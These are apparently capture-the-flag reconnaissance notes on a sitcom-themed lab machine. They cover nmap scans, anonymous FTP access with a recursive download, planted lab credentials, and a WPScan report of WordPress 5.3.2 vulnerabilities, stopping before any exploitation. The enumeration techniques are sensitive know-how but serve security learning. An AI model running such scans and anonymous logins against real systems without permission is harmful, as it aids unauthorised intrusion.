# Notes

In this file, there are all bunch of notes and attempts to exploit this machine

## Analysis
### nmap

sudo nmap -p- -T4 {TARGET_MACHINE_IP} 
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 06:16 EST
    Nmap scan report for {TARGET_MACHINE_IP}
    Host is up (0.014s latency).
    Not shown: 65531 closed tcp ports (reset)
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    80/tcp   open  http
    1337/tcp open  waste


### Port 21 - ftp

ftp {TARGET_MACHINE_IP}
    - Triggers login and gives me '220 (vsFTPd 3.0.3)'

nmap -p 21 --script=ftp-anon,ftp-syst {TARGET_MACHINE_IP} 
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 05:15 EDT
    Nmap scan report for {TARGET_MACHINE_IP}
    Host is up (0.0065s latency).

    PORT   STATE SERVICE
    21/tcp open  ftp
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | -rw-r--r--    1 ftp      ftp           539 Mar 04  2020 Welcome.txt
    | -rw-r--r--    1 ftp      ftp           114 Mar 04  2020 ftp_agreement.txt
    |_drwxr-xr-x    9 ftp      ftp          4096 Mar 04  2020 pub
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.0.1.12
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 3
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status

#### This tells us we can login as anonymous
ftp {TARGET_MACHINE_IP}
    username = anonymous

#### Get all files into machine doing
wget -r --no-parent ftp://anonymous@{TARGET_MACHINE_IP}/

#### Inside pub/

Only bernardette, howard and penny have files

#### Important Files Info

##### bernardette/PENNY_README_ASAP.txt
Bernardette's B2B company openned penny's account
Username: penny69
Password: cant post it here as sheldon said. you know the password. you use it everywhere.

##### howards/
ZIP is encrypted with password

##### penny/wifi_password.txt 
SHELDON DONT CHANGHE IT AGAIN OK!?!?!
THIS IS THE ONLY PASSWORD I CAN REMEMBER 
wifipassword: pennyisafreeloader

### Port 22 - SSH

#### Banner enumeration 

nmap -p 22 --script=banner {TARGET_MACHINE_IP}                                                                                        
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 05:42 EDT
    Nmap scan report for {TARGET_MACHINE_IP}
    Host is up (0.0057s latency).

    PORT   STATE SERVICE
    22/tcp open  ssh
    |_banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.7

    Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds

nmap -p 22 --script=ssh-hostkey,ssh-auth-methods,ssh2-enum-algos {TARGET_MACHINE_IP}
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 05:45 EDT
    Nmap scan report for {TARGET_MACHINE_IP}
    Host is up (0.015s latency).

    PORT   STATE SERVICE
    22/tcp open  ssh
    | ssh-hostkey: 
    |   2048 cf:5c:ee:76:7c:48:52:06:8d:56:07:7f:f6:5d:80:f2 (RSA)
    |   256 ab:bb:fa:f9:89:99:02:9e:e4:20:fa:37:4f:6f:ca:ca (ECDSA)
    |_  256 ea:6d:77:f3:ff:9c:d5:dd:85:e3:1e:75:3c:7b:66:47 (ED25519)
    | ssh-auth-methods: 
    |   Supported authentication methods: 
    |     publickey
    |_    password
    | ssh2-enum-algos: 
    |   kex_algorithms: (6)
    |       curve25519-sha256@libssh.org
    |       ecdh-sha2-nistp256
    |       ecdh-sha2-nistp384
    |       ecdh-sha2-nistp521
    |       diffie-hellman-group-exchange-sha256
    |       diffie-hellman-group14-sha1
    |   server_host_key_algorithms: (5)
    |       ssh-rsa
    |       rsa-sha2-512
    |       rsa-sha2-256
    |       ecdsa-sha2-nistp256
    |       ssh-ed25519
    |   encryption_algorithms: (6)
    |       chacha20-poly1305@openssh.com
    |       aes128-ctr
    |       aes192-ctr
    |       aes256-ctr
    |       aes128-gcm@openssh.com
    |       aes256-gcm@openssh.com
    |   mac_algorithms: (10)
    |       umac-64-etm@openssh.com
    |       umac-128-etm@openssh.com
    |       hmac-sha2-256-etm@openssh.com
    |       hmac-sha2-512-etm@openssh.com
    |       hmac-sha1-etm@openssh.com
    |       umac-64@openssh.com
    |       umac-128@openssh.com
    |       hmac-sha2-256
    |       hmac-sha2-512
    |       hmac-sha1
    |   compression_algorithms: (2)
    |       none
    |_      zlib@openssh.com



### Port 80 - HTTP

#### Banner enumeration

nmap -sV -p 80 --script=banner {TARGET_MACHINE_IP}
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 05:58 EDT
    Nmap scan report for {TARGET_MACHINE_IP}
    Host is up (0.0075s latency).

    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 16.76 seconds

sudo nmap -sV -p 80 --script=http-title,http-server-header,http-robots.txt,http-headers,http-methods,http-enum {TARGET_MACHINE_IP}
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 06:01 EDT
    Nmap scan report for {TARGET_MACHINE_IP}
    Host is up (0.0050s latency).

    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    | http-headers: 
    |   Date: Sat, 25 Oct 2025 12:05:48 GMT
    |   Server: Apache/2.4.18 (Ubuntu)
    |   Last-Modified: Tue, 03 Mar 2020 23:06:04 GMT
    |   ETag: "ef-59ffb591c48f0"
    |   Accept-Ranges: bytes
    |   Content-Length: 239
    |   Vary: Accept-Encoding
    |   Connection: close
    |   Content-Type: text/html
    |   
    |_  (Request type: HEAD)
    |_http-title: Fun with flags!
    | http-methods: 
    |_  Supported Methods: OPTIONS GET HEAD POST
    | http-robots.txt: 4 disallowed entries 
    |_/howard /web_shell.php /backdoor /rootflag.txt
    | http-enum: 
    |   /robots.txt: Robots file
    |   /phpmyadmin/: phpMyAdmin
    |_  /private/: Potentially interesting folder
    |_http-server-header: Apache/2.4.18 (Ubuntu)

#### Folders

#### http://{TARGET_MACHINE_IP}/howard
    /howard/stolen_data/pennys_lastname.txt = ERROR 404
    /howard/stolen_data/penny_naked.gif

#### Directoy brute forcing
Discover that there is wordpress

#### WPScan
wpscan --url http://{TARGET_MACHINE_IP}/music/wordpress/ --api-token {API_TOKEN} 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://{TARGET_MACHINE_IP}/music/wordpress/ [{TARGET_MACHINE_IP}]
[+] Started: Sat Oct 25 06:34:21 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://{TARGET_MACHINE_IP}/music/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://{TARGET_MACHINE_IP}/music/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: http://{TARGET_MACHINE_IP}/music/wordpress/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://{TARGET_MACHINE_IP}/music/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://{TARGET_MACHINE_IP}/music/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://{TARGET_MACHINE_IP}/music/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://{TARGET_MACHINE_IP}/music/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |
 | [!] 53 vulnerabilities identified:
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 5.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 5.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 5.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Search Block
 |     Fixed in: 5.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/e4bda91b-067d-45e4-a8be-672ccf8b1a06
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11030
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47636/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-vccm-6gmc-qhjh
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 5.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 5.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
 |     Fixed in: 5.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/831e4a94-239c-4061-b66e-f5ca0dbb84fa
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4046
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rpwf-hrh2-39jf
 |      - https://pentest.co.uk/labs/research/subtle-stored-xss-wordpress-core/
 |      - https://www.youtube.com/watch?v=tCh7Y8z8fb4
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 5.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 5.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 |     Fixed in: 5.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/d8addb42-e70b-4439-b828-fd0697e5d9d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
 |      - https://www.exploit-db.com/exploits/48770/
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
 |      - https://hackerone.com/reports/406289
 |
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 |     Fixed in: 5.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/b6f69ff1-4c11-48d2-b512-c65168988c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
 |
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 |     Fixed in: 5.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 5.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 5.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.3.10
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.3.13
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 5.3.13
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 5.3.13
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 5.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 5.3.15
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 5.3.15
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 5.3.15
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 5.3.15
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 5.3.15
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 5.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 5.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 5.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 5.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 5.3.17
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
